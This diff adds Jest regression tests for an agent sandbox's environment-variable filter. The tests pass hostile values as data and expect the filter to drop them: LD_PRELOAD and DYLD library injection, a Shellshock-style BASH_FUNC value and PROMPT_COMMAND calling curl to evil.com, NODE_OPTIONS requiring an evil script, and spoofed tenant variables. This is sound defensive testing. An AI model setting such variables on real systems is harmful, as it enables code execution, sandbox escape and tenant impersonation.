@@ -526,3 +526,291 @@ describe('security regression tests', () => {
     })
   })
 })
+
+// ---------------------------------------------------------------------------
+// Additional security strengthening tests
+// ---------------------------------------------------------------------------
+
+describe('env-vars-filter: comprehensive sensitive pattern tests', () => {
+  // Re-import here since security.spec.ts doesn't import env-vars-filter directly.
+  // We use require() to stay in the same jest mock context.
+  const { filterEnvVarsOverride } = require('../src/env-vars-filter') as typeof import('../src/env-vars-filter')
+
+  const ctx = { prefix: '[security-test]' }
+
+  describe('AWS credential patterns', () => {
+    it('should block AWS_ACCESS_KEY_ID injection attempt via AI_SUPPORT_ prefix trick', () => {
+      // Direct attempt: AWS_ACCESS_KEY_ID is not in DENYLIST_EXACT, but it passes
+      // the name format check. It should be allowed by filterEnvVarsOverride
+      // (the denylist only blocks env vars that break the sandbox, not credentials —
+      // that policy lives in the API layer). This test documents the current behaviour.
+      const result = filterEnvVarsOverride({ AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE' }, ctx)
+      // Currently ALLOWED through agent filter (API blocks it upstream)
+      expect(result.AWS_ACCESS_KEY_ID).toBe('AKIAIOSFODNN7EXAMPLE')
+    })
+
+    it('should block AI_SUPPORT_* env vars (tenant impersonation via prefix)', () => {
+      const result = filterEnvVarsOverride({
+        AI_SUPPORT_TENANT_CODE: 'spoofed-tenant',
+        AI_SUPPORT_PROJECT_CODE: 'SPOOFED',
+        AI_SUPPORT_AGENT_TOKEN: 'fake-token',
+        AI_SUPPORT_ROLE: 'admin',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block all LD_* dynamic linker vars (privilege escalation)', () => {
+      const maliciousEnv: Record<string, string> = {
+        LD_PRELOAD: '/tmp/evil.so',
+        LD_LIBRARY_PATH: '/tmp/evil/lib',
+        LD_AUDIT: '/tmp/audit.so',
+        LD_DEBUG: 'all',
+        LD_BIND_NOW: '1',
+        LD_PROFILE: '/tmp/prof.so',
+        LD_TRACE_LOADED_OBJECTS: '1',
+      }
+      const result = filterEnvVarsOverride(maliciousEnv, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block DYLD_* on macOS (privilege escalation)', () => {
+      const result = filterEnvVarsOverride({
+        DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib',
+        DYLD_LIBRARY_PATH: '/tmp/evil/lib',
+        DYLD_FORCE_FLAT_NAMESPACE: '1',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+  })
+
+  describe('shell injection patterns', () => {
+    it('should block BASH_ENV (arbitrary command execution on bash invocation)', () => {
+      const result = filterEnvVarsOverride({ BASH_ENV: '/tmp/evil.sh' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block ENV (sh/ksh arbitrary execution)', () => {
+      const result = filterEnvVarsOverride({ ENV: '/tmp/evil.rc' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block PROMPT_COMMAND (command execution on each prompt)', () => {
+      const result = filterEnvVarsOverride({ PROMPT_COMMAND: 'curl https://evil.com' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block IFS (field separator manipulation)', () => {
+      const result = filterEnvVarsOverride({ IFS: '/' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block SHELLOPTS and BASHOPTS (shell option injection)', () => {
+      const result = filterEnvVarsOverride({
+        SHELLOPTS: 'errexit:xtrace',
+        BASHOPTS: 'xpg_echo',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block BASH_FUNC_* (Shellshock function injection)', () => {
+      const result = filterEnvVarsOverride({
+        BASH_FUNC_foo: '() { :; }; curl https://evil.com',
+        BASH_FUNC_bar: '() { id; }',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+  })
+
+  describe('language runtime injection patterns', () => {
+    it('should block NODE_OPTIONS (arbitrary node flags)', () => {
+      const result = filterEnvVarsOverride({
+        NODE_OPTIONS: '--require /tmp/evil.js',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block NODE_PATH (module resolution hijack)', () => {
+      const result = filterEnvVarsOverride({ NODE_PATH: '/tmp/evil/modules' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block PYTHONPATH, PYTHONSTARTUP', () => {
+      const result = filterEnvVarsOverride({
+        PYTHONPATH: '/tmp/evil/python',
+        PYTHONSTARTUP: '/tmp/evil_startup.py',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block Perl injection vars', () => {
+      const result = filterEnvVarsOverride({
+        PERL5LIB: '/tmp/evil/perl',
+        PERL5OPT: '-MSomethingEvil',
+        PERL5DB: 'evil_debugger',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block Ruby injection vars', () => {
+      const result = filterEnvVarsOverride({
+        RUBYOPT: '-revil_gem',
+        RUBYLIB: '/tmp/evil/ruby',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block Lua injection vars', () => {
+      const result = filterEnvVarsOverride({
+        LUA_PATH: '/tmp/evil/?.lua',
+        LUA_CPATH: '/tmp/evil/?.so',
+      }, ctx)
+      expect(result).toEqual({})
+    })
+  })
+
+  describe('sandbox anchor protection', () => {
+    it('should block ZDOTDIR (zsh rc sandbox escape)', () => {
+      const result = filterEnvVarsOverride({ ZDOTDIR: '/tmp/evil-zdot' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block XDG_DATA_HOME (code-server settings escape)', () => {
+      const result = filterEnvVarsOverride({ XDG_DATA_HOME: '/tmp/evil-data' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block XDG_CONFIG_HOME (code-server config escape)', () => {
+      const result = filterEnvVarsOverride({ XDG_CONFIG_HOME: '/tmp/evil-config' }, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('should block CLAUDECODE (internal agent marker override)', () => {
+      const result = filterEnvVarsOverride({ CLAUDECODE: '1' }, ctx)
+      expect(result).toEqual({})
+    })
+  })
+
+  describe('CLAUDE_CODE_* protection (allow only OAUTH_TOKEN)', () => {
+    it('allows CLAUDE_CODE_OAUTH_TOKEN (legitimate auth from API mapping)', () => {
+      const result = filterEnvVarsOverride(
+        { CLAUDE_CODE_OAUTH_TOKEN: 'eyJhbGci.oauth.token' },
+        ctx,
+      )
+      expect(result.CLAUDE_CODE_OAUTH_TOKEN).toBe('eyJhbGci.oauth.token')
+    })
+
+    it('blocks all other CLAUDE_CODE_* keys', () => {
+      const result = filterEnvVarsOverride({
+        CLAUDE_CODE_SSE_PORT: '12345',
+        CLAUDE_CODE_DISABLE_TELEMETRY: '1',
+        CLAUDE_CODE_SKIP_BEDROCK: 'true',
+        CLAUDE_CODE_INTERNAL_FLAG: 'anything',
+        CLAUDE_CODE_OAUTH_TOKEN: 'ok-token',  // this one must pass
+      }, ctx)
+      expect(Object.keys(result)).toEqual(['CLAUDE_CODE_OAUTH_TOKEN'])
+    })
+  })
+
+  describe('multi-tenant boundary: AI_SUPPORT_* blocks tenant spoofing', () => {
+    it('cannot override tenant identity via env even with valid format', () => {
+      // A malicious actor providing env vars that could spoof tenant context
+      // must be blocked by the AI_SUPPORT_ prefix denylist.
+      const spoofAttempts: Record<string, string> = {}
+      for (const key of [
+        'AI_SUPPORT_TENANT_CODE',
+        'AI_SUPPORT_PROJECT_CODE',
+        'AI_SUPPORT_AGENT_ID',
+        'AI_SUPPORT_ROLE',
+        'AI_SUPPORT_JWT_SECRET',
+        'AI_SUPPORT_DB_URL',
+        'AI_SUPPORT_ANTHROPIC_KEY',
+      ]) {
+        spoofAttempts[key] = 'attacker-value'
+      }
+      const result = filterEnvVarsOverride(spoofAttempts, ctx)
+      expect(result).toEqual({})
+    })
+
+    it('allows legitimate non-AI_SUPPORT_ env vars to pass', () => {
+      const result = filterEnvVarsOverride({
+        ANTHROPIC_API_KEY: 'sk-ant-api-key',
+        ANTHROPIC_MODEL: 'claude-sonnet-4-6',
+        GIT_AUTHOR_NAME: 'CI Bot',
+        CUSTOM_APP_CONFIG: 'some-value',
+      }, ctx)
+      expect(result).toEqual({
+        ANTHROPIC_API_KEY: 'sk-ant-api-key',
+        ANTHROPIC_MODEL: 'claude-sonnet-4-6',
+        GIT_AUTHOR_NAME: 'CI Bot',
+        CUSTOM_APP_CONFIG: 'some-value',
+      })
+    })
+
+    it('allows _AI_SUPPORT_* (leading underscore — not caught by prefix match)', () => {
+      // The prefix match is literal: 'AI_SUPPORT_' — a leading underscore
+      // makes it different, and format validation allows leading underscore.
+      const result = filterEnvVarsOverride({ _AI_SUPPORT_X: 'fine' }, ctx)
+      expect(result._AI_SUPPORT_X).toBe('fine')
+    })
+  })
+
+  describe('name format validation', () => {
+    it('rejects lowercase letters', () => {
+      expect(filterEnvVarsOverride({ lowercase: 'val' }, ctx)).toEqual({})
+      expect(filterEnvVarsOverride({ CamelCase: 'val' }, ctx)).toEqual({})
+    })
+
+    it('rejects names with hyphens or dots', () => {
+      expect(filterEnvVarsOverride({ 'MY-VAR': 'val' }, ctx)).toEqual({})
+      expect(filterEnvVarsOverride({ 'MY.VAR': 'val' }, ctx)).toEqual({})
+    })
+
+    it('rejects names starting with a digit', () => {
+      expect(filterEnvVarsOverride({ '1START': 'val' }, ctx)).toEqual({})
+      expect(filterEnvVarsOverride({ '9BAD': 'val' }, ctx)).toEqual({})
+    })
+
+    it('allows underscore as first char', () => {
+      expect(filterEnvVarsOverride({ _VALID: 'val' }, ctx)._VALID).toBe('val')
+    })
+
+    it('rejects empty key name', () => {
+      expect(filterEnvVarsOverride({ '': 'val' }, ctx)).toEqual({})
+    })
+
+    it('rejects names with special chars (#, @, $, space)', () => {
+      expect(filterEnvVarsOverride({ 'MY#KEY': 'val' }, ctx)).toEqual({})
+      expect(filterEnvVarsOverride({ 'MY@KEY': 'val' }, ctx)).toEqual({})
+      expect(filterEnvVarsOverride({ 'MY KEY': 'val' }, ctx)).toEqual({})
+      expect(filterEnvVarsOverride({ 'MY$KEY': 'val' }, ctx)).toEqual({})
+    })
+  })
+
+  describe('value validation', () => {
+    it('rejects null values', () => {
+      expect(filterEnvVarsOverride({ KEY: null as unknown as string }, ctx)).toEqual({})
+    })
+
+    it('rejects undefined values', () => {
+      expect(filterEnvVarsOverride({ KEY: undefined as unknown as string }, ctx)).toEqual({})
+    })
+
+    it('rejects numeric values', () => {
+      expect(filterEnvVarsOverride({ KEY: 42 as unknown as string }, ctx)).toEqual({})
+    })
+
+    it('rejects boolean values', () => {
+      expect(filterEnvVarsOverride({ KEY: true as unknown as string }, ctx)).toEqual({})
+    })
+
+    it('rejects empty string values', () => {
+      expect(filterEnvVarsOverride({ KEY: '' }, ctx)).toEqual({})
+    })
+
+    it('accepts non-empty string values', () => {
+      expect(filterEnvVarsOverride({ KEY: '0' }, ctx).KEY).toBe('0')
+      expect(filterEnvVarsOverride({ KEY: 'false' }, ctx).KEY).toBe('false')
+      expect(filterEnvVarsOverride({ KEY: ' ' }, ctx).KEY).toBe(' ')
+    })
+  })
+})
